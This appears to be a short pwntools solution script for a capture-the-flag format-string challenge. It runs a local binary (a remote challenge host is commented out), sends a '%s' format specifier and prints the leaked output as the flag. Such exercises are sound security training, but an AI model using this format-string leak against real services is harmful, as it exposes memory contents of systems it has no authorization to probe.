from pwn import *

r = process("./source/format100")
#r = remote("formatstring100.heltsikker.no", 9000)

r.sendline("%s")
r.recvuntil("Output: ")
data = r.recvline()
print("Flag:", data)

